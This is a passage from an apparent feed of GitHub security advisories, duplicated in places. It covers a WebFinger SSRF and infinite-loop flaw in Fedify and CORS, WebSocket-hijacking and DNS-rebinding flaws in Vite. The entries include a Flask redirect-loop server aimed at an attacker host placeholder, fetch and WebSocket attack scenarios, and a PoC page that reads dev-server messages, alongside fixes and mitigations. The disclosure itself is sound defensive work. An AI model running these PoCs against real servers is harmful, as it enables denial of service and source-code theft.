<li>For each web resource (for the <strong><em>lookupWebFinger</em></strong> function and also URLs found on the “**<em>Location</em><strong>” header inside the loop) use the “</strong><em>validatePublicUrl</em>**” function to verify that it is not targeting a local resource.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx">https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23221">https://nvd.nist.gov/vuln/detail/CVE-2025-23221</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151">https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a">https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645">https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645</a></li>
<li><a href="https://github.com/advisories/GHSA-c59p-wq67-24wx">https://github.com/advisories/GHSA-c59p-wq67-24wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c59p-wq67-24wx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T19:58:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify/fedify]]></title>
        <id>https://github.com/advisories/GHSA-c59p-wq67-24wx</id>
        <link href="https://github.com/advisories/GHSA-c59p-wq67-24wx"/>
        <updated>2025-01-21T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.
Moreover, this issue can also be maneuvered into performing a Blind SSRF attack.</p>
<h3 id="details">Details</h3>
<p>The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (<a href="https://www.w3.org/TR/activitypub/#security-considerations">https://www.w3.org/TR/activitypub/#security-considerations</a>), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.</p>
<p>The <strong>lookupWebFinger</strong> function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.
On Fedify, two client-facing functions implement the <strong>lookupWebFinger</strong> function- <strong>getActorHandle</strong>, and <strong>lookupObject</strong>, which are both used as a wrapper for the vulnerable lookup function.
As the <strong>lookupObject</strong> function is implemented only for CLI usage, we won’t focus our PoC and explanation on it, but it is still vulnerable in the same way <strong>getActorHandle</strong> is.</p>
<p>The <strong>getActorHandle</strong> function is a wrapper function for the <strong>getActorHandleInternal</strong> function (both present at <em>/src/vocab/actor.ts</em>):</p>
<pre><code class="language-javascript">async function getActorHandleInternal(
  actor: Actor | URL,
  options: GetActorHandleOptions = {},
): Promise&lt;`@${string}@${string}` | `${string}@${string}`&gt; {
  const actorId = actor instanceof URL ? actor : actor.id;
  if (actorId != null) {
    const result = await lookupWebFinger(actorId, {
      userAgent: options.userAgent,
      tracerProvider: options.tracerProvider,
    });
    if (result != null) {
      const aliases = [...(result.aliases ?? [])];
      if (result.subject != null) aliases.unshift(result.subject);
      for (const alias of aliases) {
        const match = alias.match(/^acct:([^@]+)@([^@]+)$/);
        if (match != null) {
          const hostname = new URL(`https://${match[2]}/`).hostname;
          if (
            hostname !== actorId.hostname &amp;&amp;
            !await verifyCrossOriginActorHandle(
              actorId.href,
              alias,
              options.userAgent,
              options.tracerProvider,
            )
          ) {
            continue;
          }
          return normalizeActorHandle(`@${match[1]}@${match[2]}`, options);
        }
      }
    }
  }
  if (
    !(actor instanceof URL) &amp;&amp; actor.preferredUsername != null &amp;&amp;
    actor.id != null
  ) {
    return normalizeActorHandle(
      `@${actor.preferredUsername}@${actor.id.host}`,
      options,
    );
  }
  throw new TypeError(
    "Actor does not have enough information to get the handle.",
  );
}
</code></pre>
<p>The <strong>actorId</strong> parameter containing a URL of the actor ID sinks into the <strong>lookupWebFinger</strong> function which is a wrapper for the <strong>lookupWebFingerInternal</strong>:</p>
<pre><code class="language-javascript">async function lookupWebFingerInternal(
  resource: URL | string,
  options: LookupWebFingerOptions = {},
): Promise&lt;ResourceDescriptor | null&gt; {
  if (typeof resource === "string") resource = new URL(resource);
  let protocol = "https:";
  let server: string;
  if (resource.protocol === "acct:") {
    const atPos = resource.pathname.lastIndexOf("@");
    if (atPos &lt; 0) return null;
    server = resource.pathname.substring(atPos + 1);
    if (server === "") return null;
  } else {
    protocol = resource.protocol;
    server = resource.host;
  }
  let url = new URL(`${protocol}//${server}/.well-known/webfinger`);
  url.searchParams.set("resource", resource.href);
  while (true) {
    logger.debug(
      "Fetching WebFinger resource descriptor from {url}...",
      { url: url.href },
    );
    let response: Response;
    try {
      response = await fetch(url, {
        headers: {
          Accept: "application/jrd+json",
          "User-Agent": typeof options.userAgent === "string"
            ? options.userAgent
            : getUserAgent(options.userAgent),
        },
        redirect: "manual",
      });
    } catch (error) {
      logger.debug(
        "Failed to fetch WebFinger resource descriptor: {error}",
        { url: url.href, error },
      );
      return null;
    }
    if (
      response.status &gt;= 300 &amp;&amp; response.status &lt; 400 &amp;&amp;
      response.headers.has("Location")
    ) {
      url = new URL(
        response.headers.get("Location")!,
        response.url == null || response.url === "" ? url : response.url,
      );
      continue;
    }
    if (!response.ok) {
      logger.debug(
        "Failed to fetch WebFinger resource descriptor: {status} {statusText}.",
        {
          url: url.href,
          status: response.status,
          statusText: response.statusText,
        },
      );
      return null;
    }
    try {
      return await response.json() as ResourceDescriptor;
    } catch (e) {
      if (e instanceof SyntaxError) {
        logger.debug(
          "Failed to parse WebFinger resource descriptor as JSON: {error}",
          { error: e },
        );
        return null;
      }
      throw e;
    }
  }
}
</code></pre>
<p>The function takes the <strong>actorId</strong> parameter containing the actor ID URL, extracts the scheme and uses the rest of the URL (host+port+path) directly inside a hard-coded Webfinger URL address which in turn sinks into a fetch request.</p>
<p>On the fetch request, the <strong>redirect</strong> attribute is set to “<strong>manual</strong>” preventing automated redirects. However, redirects are still handled using custom code that loops over responses and re-fetching the URL found inside the “Location” header until receiving a valid response or an error occurs (loop keeps until 300&gt;status code&gt;400).</p>
<p>This custom redirect implementation contains multiple issues:
1.The redirect loop is endless ( while(true) loop ) without any iteration limiting, allowing attackers to perform DoS via endless redirecting.
2. A Blind SSRF attack to any URL, with arbitrary Host, Port and Path is possible via the current custom redirect implementation.
3. As the redirect handler is a custom one, it breaches the security mechanisms presented by the native redirect handler of fetch - allowing the attacker to redirect to different schemes such as data or file schemes.</p>
<p>In order to successfully perform any of the attacks described above, an attacker needs to create a federated app which presents a malicious actor object, containing an actor ID URL of a second server which performs a recursive redirect to itself, or a URL containing an internal resource.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>In order to show a use case of the vulnerability, we can use the demo app presented at this URL: <a href="https://github.com/dahlia/microblog">https://github.com/dahlia/microblog</a>.</li>
<li>We will create two machines, victim and attacker, each one on a different server with different domains.</li>
</ol>
<p><strong><em>Victim Machine</em></strong></p>
<ol>
<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>
<li>Install a Deno server:
<code>curl -fsSL https://deno.land/install.sh | sh</code>
<code>source ~/.bashrc</code>
<code>deno --version #check deno is working</code></li>
<li>Pull the git repository of the victim blog app:
<code>git clone https://github.com/dahlia/fedify.git</code></li>
<li>Modify the federation object to remove signature checks for the sake of easy testing:
On file <strong><em>/examples/blog/federation/mod.ts</em></strong> edit the <strong><em>createFederation</em></strong> object the following attribute: <strong><em>skipSignatureVerification: true</em></strong>.</li>
<li>Change into the blog app directory ( /examples/blog ) and run the app:
<code>deno task preview</code></li>
<li>Surf to the application on the browser, and register a user on the app.</li>
</ol>
<p><strong><em>Attacker Machine</em></strong></p>
<ol>
<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>
<li>Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):
<code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</code>
<code>source ~/.bashrc</code>
<code>nvm list-remote</code></li>
<li>Install the latest stable version:
<code>nvm install {latest_ver} #for example: v20.10.0</code>
<code>source ~/.bashrc</code>
<code>npm -v #check it works</code>
<code>node -v #check it works</code></li>
<li>Download the attacker app repository:
<code>git clone https://github.com/dahlia/microblog.git</code></li>
<li>Disable request signature validations:
Edit the <strong><em>/src/federation.ts</em></strong> file and add a <strong><em>skipSignatureVerification: true</em></strong> attribute to the <strong><em>createFederation</em></strong> object.</li>
<li>Modify the <strong><em>/src/federation.ts</em></strong> file and tamper with the Person object on the actor dispatcher ( <strong><em>setActorDispatcher("/users/{identifier}"</em></strong> ) - change the actor ID attribute **<em>“id: ctx.getActorUri(identifier)</em><strong>” into “</strong><em>id: new URL(‘http://:1337/users/enterloop’)</em>**”.</li>
<li>Install python flask and create the Python Flask redirect server:
<code>apt update</code>
<code>apt install python3-flask</code></li>
</ol>
<pre><code class="language-python">from flask import Flask, redirect

app = Flask(__name__)

@app.route('/health')
def health():
    return "hello", 200

@app.route('/.well-known/webfinger')
def ssrfinger():
    return redirect("http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop")

@app.route('/endlessloop')
def endlessloop():
    return redirect("http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop")

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0' ,port=1337)
</code></pre>
<ol start="8">
<li>Run the python server and attempt to reach the “**_/health_**” path to see the server functions as expected.</li>
<li>Read the <strong><em>README.txt</em></strong> file on the attacker app and follow the instructions on how to execute the app.</li>
<li>Surf the app on the browser and attempt to follow the federated user on the victim’s machine.</li>
<li>Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).</li>
</ol>
<h3 id="impact">Impact</h3>
<ol>
<li>Implement a limiting stop condition for the endless loop to prevent infinite loops.</li>
<li>Validate the scheme while performing a manual redirection handler.</li>
<li>For each web resource (for the <strong><em>lookupWebFinger</em></strong> function and also URLs found on the “**<em>Location</em><strong>” header inside the loop) use the “</strong><em>validatePublicUrl</em>**” function to verify that it is not targeting a local resource.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx">https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23221">https://nvd.nist.gov/vuln/detail/CVE-2025-23221</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151">https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a">https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645">https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645</a></li>
<li><a href="https://github.com/advisories/GHSA-c59p-wq67-24wx">https://github.com/advisories/GHSA-c59p-wq67-24wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c59p-wq67-24wx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T19:58:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Websites were able to send any requests to the development server and read the response in vite]]></title>
        <id>https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</id>
        <link href="https://github.com/advisories/GHSA-vg6x-rcgg-rjx6"/>
        <updated>2025-01-21T19:52:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.</p>
<h3 id="upgrade-path">Upgrade Path</h3>
<p>Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.</p>
<ul>
<li>Using the backend integration feature</li>
<li>Using a reverse proxy in front of Vite</li>
<li>Accessing the development server via a domain other than <code>localhost</code> or <code>*.localhost</code></li>
<li>Using a plugin / framework that connects to the WebSocket server on their own from the browser</li>
</ul>
<h4 id="using-the-backend-integration-feature">Using the backend integration feature</h4>
<p>If you are using the backend integration feature and not setting <a href="https://vite.dev/config/server-options.html#server-origin"><code>server.origin</code></a>, you need to add the origin of the backend server to the <a href="https://github.com/expressjs/cors#configuration-options"><code>server.cors.origin</code></a> option. Make sure to set a specific origin rather than <code>*</code>, otherwise any origin can access your development server.</p>
<h4 id="using-a-reverse-proxy-in-front-of-vite">Using a reverse proxy in front of Vite</h4>
<p>If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than <code>localhost</code> or <code>*.localhost</code>, you need to add the hostname to the new <a href="https://vite.dev/config/server-options.html#server-allowedhosts"><code>server.allowedHosts</code></a> option. For example, if the reverse proxy is sending requests to <code>http://vite:5173</code>, you need to add <code>vite</code> to the <code>server.allowedHosts</code> option.</p>
<h4 id="accessing-the-development-server-via-a-domain-other-than-localhost-or-localhost">Accessing the development server via a domain other than <code>localhost</code> or <code>*.localhost</code></h4>
<p>You need to add the hostname to the new <a href="https://vite.dev/config/server-options.html#server-allowedhosts"><code>server.allowedHosts</code></a> option. For example, if you are accessing the development server via <code>http://foo.example.com:8080</code>, you need to add <code>foo.example.com</code> to the <code>server.allowedHosts</code> option.</p>
<h4 id="using-a-plugin--framework-that-connects-to-the-websocket-server-on-their-own-from-the-browser">Using a plugin / framework that connects to the WebSocket server on their own from the browser</h4>
<p>If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.</p>
<p>In that case, you can either:</p>
<ul>
<li>fix the plugin / framework code to the make it compatible with the new version of Vite</li>
<li>set <code>legacy.skipWebSocketTokenCheck: true</code> to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite<ul>
<li>When enabling this option, <strong>make sure that you are aware of the security implications</strong> described in the impact section of [2] above.</li>
</ul>
</li>
</ul>
<h3 id="mitigation-without-upgrading-vite">Mitigation without upgrading Vite</h3>
<h4 id="1-permissive-default-cors-settings">[1]: Permissive default CORS settings</h4>
<p>Set <code>server.cors</code> to <code>false</code> or limit <code>server.cors.origin</code> to trusted origins.</p>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<p>There aren't any mitigations for this.</p>
<h4 id="3-lack-of-validation-on-the-host-header-for-http-requests">[3]: Lack of validation on the Host header for HTTP requests</h4>
<p>Use Chrome 94+ or use HTTPS for the development server.</p>
<h3 id="details">Details</h3>
<p>There are three causes that allowed malicious websites to send any requests to the development server:</p>
<h4 id="1-permissive-default-cors-settings-1">[1]: Permissive default CORS settings</h4>
<p>Vite sets the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin"><code>Access-Control-Allow-Origin</code></a> header depending on <a href="https://vite.dev/config/server-options.html#server-cors"><code>server.cors</code></a> option. The default value was <code>true</code> which sets <code>Access-Control-Allow-Origin: *</code>. This allows websites on any origin to <code>fetch</code> contents served on the development server.</p>
<p>Attack scenario:</p>
<ol>
<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>
<li>The user accesses the malicious web page.</li>
<li>The attacker sends a <code>fetch('http://127.0.0.1:5173/main.js')</code> request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.</li>
<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code>.</li>
</ol>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections-1">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<p>Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server <a href="https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157">did not perform validation on the Origin header</a> and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection (<a href="https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72">list of the file paths that changed, the file content where the errored happened, etc.</a>), but plugins can send arbitrary messages and may include more sensitive information.</p>
<p>Attack scenario:</p>
<ol>
<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>
<li>The user accesses the malicious web page.</li>
<li>The attacker runs <code>new WebSocket('http://127.0.0.1:5173', 'vite-hmr')</code> by JS in that malicious web page.</li>
<li>The user edits some files.</li>
<li>Vite sends some HMR messages over WebSocket.</li>
<li>The attacker gets the content of the HMR messages.</li>
</ol>
<h4 id="3-lack-of-validation-on-the-host-header-for-http-requests-1">[3]: Lack of validation on the Host header for HTTP requests</h4>
<p>Unless <a href="https://vite.dev/config/server-options.html#server-https"><code>server.https</code></a> is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.</p>
<ol>
<li>The attacker serves a malicious web page that is served on <strong>HTTP</strong> (<code>http://malicious.example.com:5173</code>) (HTTPS won't work).</li>
<li>The user accesses the malicious web page.</li>
<li>The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).</li>
<li>The attacker sends a <code>fetch('/main.js')</code> request by JS in that malicious web page.</li>
<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code> bypassing the same origin policy.</li>
</ol>
<h3 id="impact">Impact</h3>
<h4 id="1-permissive-default-cors-settings-2">[1]: Permissive default CORS settings</h4>
<p>Users with the default <code>server.cors</code> option may:</p>
<ul>
<li>get the source code stolen by malicious websites</li>
<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>
<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>
</ul>
</li>
</ul>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections-2">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<p>All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.</p>
<p>For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.</p>
<p>For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.</p>
<h4 id="3-lack-of-validation-on-the-host-header-for-http-requests-2">[3]: Lack of validation on the Host header for HTTP requests</h4>
<p>Users using HTTP for the development server and using a browser that is not Chrome 94+ may:</p>
<ul>
<li>get the source code stolen by malicious websites</li>
<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>
<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>
</ul>
</li>
</ul>
<p>Chrome 94+ users are not affected for [3], because <a href="https://developer.chrome.com/blog/private-network-access-update#chrome_94">sending a request to a private network page from public non-HTTPS page is forbidden</a> since Chrome 94.</p>
<h3 id="related-information">Related Information</h3>
<p>Safari has <a href="https://bugs.webkit.org/show_bug.cgi?id=171934">a bug that blocks requests to loopback addresses from HTTPS origins</a>. This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of "the malicious web page is served on HTTP" to make [1] and [2] to work.</p>
<h3 id="poc">PoC</h3>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections-3">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<ol>
<li>I used the <code>react</code> template which utilizes HMR functionality.</li>
</ol>
<pre><code>npm create vite@latest my-vue-app-react -- --template react
</code></pre>
<ol start="2">
<li>Then on a malicious server, serve the following POC html:</li>
</ol>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html lang="en"&gt;
    &lt;head&gt;
        &lt;meta charset="utf-8" /&gt;
        &lt;title&gt;vite CSWSH&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div id="logs"&gt;&lt;/div&gt;
        &lt;script&gt;
            const div = document.querySelectorAll('#logs')[0];
            const ws = new WebSocket('ws://localhost:5173','vite-hmr');
            ws.onmessage = event =&gt; {
                const logLine = document.createElement('p');
                logLine.innerHTML = event.data;
                div.append(logLine);
            };
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ol start="3">
<li>Kick off Vite</li>
</ol>
<pre><code>npm run dev
</code></pre>
<ol start="4">
<li>Load the development server (open <code>http://localhost:5173/</code>) as well as the malicious page in the browser. </li>
<li>Edit <code>src/App.jsx</code> file and intentionally place a syntax error</li>
<li>Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed</li>
</ol>
<p>Here's a video demonstrating the POC:</p>
<p><a href="https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961">https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6">https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24010">https://nvd.nist.gov/vuln/detail/CVE-2025-24010</a></li>
<li><a href="https://github.com/advisories/GHSA-vg6x-rcgg-rjx6">https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T19:52:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Websites were able to send any requests to the development server and read the response in vite]]></title>
        <id>https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</id>
        <link href="https://github.com/advisories/GHSA-vg6x-rcgg-rjx6"/>
        <updated>2025-01-21T19:52:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.</p>
<h3 id="upgrade-path">Upgrade Path</h3>
<p>Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.</p>
<ul>
<li>Using the backend integration feature</li>
<li>Using a reverse proxy in front of Vite</li>
<li>Accessing the development server via a domain other than <code>localhost</code> or <code>*.localhost</code></li>
<li>Using a plugin / framework that connects to the WebSocket server on their own from the browser</li>
</ul>
<h4 id="using-the-backend-integration-feature">Using the backend integration feature</h4>
<p>If you are using the backend integration feature and not setting <a href="https://vite.dev/config/server-options.html#server-origin"><code>server.origin</code></a>, you need to add the origin of the backend server to the <a href="https://github.com/expressjs/cors#configuration-options"><code>server.cors.origin</code></a> option. Make sure to set a specific origin rather than <code>*</code>, otherwise any origin can access your development server.</p>
<h4 id="using-a-reverse-proxy-in-front-of-vite">Using a reverse proxy in front of Vite</h4>
<p>If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than <code>localhost</code> or <code>*.localhost</code>, you need to add the hostname to the new <a href="https://vite.dev/config/server-options.html#server-allowedhosts"><code>server.allowedHosts</code></a> option. For example, if the reverse proxy is sending requests to <code>http://vite:5173</code>, you need to add <code>vite</code> to the <code>server.allowedHosts</code> option.</p>
<h4 id="accessing-the-development-server-via-a-domain-other-than-localhost-or-localhost">Accessing the development server via a domain other than <code>localhost</code> or <code>*.localhost</code></h4>
<p>You need to add the hostname to the new <a href="https://vite.dev/config/server-options.html#server-allowedhosts"><code>server.allowedHosts</code></a> option. For example, if you are accessing the development server via <code>http://foo.example.com:8080</code>, you need to add <code>foo.example.com</code> to the <code>server.allowedHosts</code> option.</p>
<h4 id="using-a-plugin--framework-that-connects-to-the-websocket-server-on-their-own-from-the-browser">Using a plugin / framework that connects to the WebSocket server on their own from the browser</h4>
<p>If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.</p>
<p>In that case, you can either:</p>
<ul>
<li>fix the plugin / framework code to the make it compatible with the new version of Vite</li>
<li>set <code>legacy.skipWebSocketTokenCheck: true</code> to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite<ul>
<li>When enabling this option, <strong>make sure that you are aware of the security implications</strong> described in the impact section of [2] above.</li>
</ul>
</li>
</ul>
<h3 id="mitigation-without-upgrading-vite">Mitigation without upgrading Vite</h3>
<h4 id="1-permissive-default-cors-settings">[1]: Permissive default CORS settings</h4>
<p>Set <code>server.cors</code> to <code>false</code> or limit <code>server.cors.origin</code> to trusted origins.</p>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<p>There aren't any mitigations for this.</p>
<h4 id="3-lack-of-validation-on-the-host-header-for-http-requests">[3]: Lack of validation on the Host header for HTTP requests</h4>
<p>Use Chrome 94+ or use HTTPS for the development server.</p>
<h3 id="details">Details</h3>
<p>There are three causes that allowed malicious websites to send any requests to the development server:</p>
<h4 id="1-permissive-default-cors-settings-1">[1]: Permissive default CORS settings</h4>
<p>Vite sets the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin"><code>Access-Control-Allow-Origin</code></a> header depending on <a href="https://vite.dev/config/server-options.html#server-cors"><code>server.cors</code></a> option. The default value was <code>true</code> which sets <code>Access-Control-Allow-Origin: *</code>. This allows websites on any origin to <code>fetch</code> contents served on the development server.</p>
<p>Attack scenario:</p>
<ol>
<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>
<li>The user accesses the malicious web page.</li>
<li>The attacker sends a <code>fetch('http://127.0.0.1:5173/main.js')</code> request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.</li>
<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code>.</li>
</ol>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections-1">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<p>Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server <a href="https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157">did not perform validation on the Origin header</a> and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection (<a href="https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72">list of the file paths that changed, the file content where the errored happened, etc.</a>), but plugins can send arbitrary messages and may include more sensitive information.</p>
<p>Attack scenario:</p>
<ol>
<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>
<li>The user accesses the malicious web page.</li>
<li>The attacker runs <code>new WebSocket('http://127.0.0.1:5173', 'vite-hmr')</code> by JS in that malicious web page.</li>
<li>The user edits some files.</li>
<li>Vite sends some HMR messages over WebSocket.</li>
<li>The attacker gets the content of the HMR messages.</li>
</ol>
<h4 id="3-lack-of-validation-on-the-host-header-for-http-requests-1">[3]: Lack of validation on the Host header for HTTP requests</h4>
<p>Unless <a href="https://vite.dev/config/server-options.html#server-https"><code>server.https</code></a> is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.</p>
<ol>
<li>The attacker serves a malicious web page that is served on <strong>HTTP</strong> (<code>http://malicious.example.com:5173</code>) (HTTPS won't work).</li>
<li>The user accesses the malicious web page.</li>
<li>The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).</li>
<li>The attacker sends a <code>fetch('/main.js')</code> request by JS in that malicious web page.</li>
<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code> bypassing the same origin policy.</li>
</ol>
<h3 id="impact">Impact</h3>
<h4 id="1-permissive-default-cors-settings-2">[1]: Permissive default CORS settings</h4>
<p>Users with the default <code>server.cors</code> option may:</p>
<ul>
<li>get the source code stolen by malicious websites</li>
<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>
<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>
</ul>
</li>
</ul>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections-2">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<p>All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.</p>
<p>For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.</p>
<p>For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.</p>
<h4 id="3-lack-of-validation-on-the-host-header-for-http-requests-2">[3]: Lack of validation on the Host header for HTTP requests</h4>
<p>Users using HTTP for the development server and using a browser that is not Chrome 94+ may:</p>
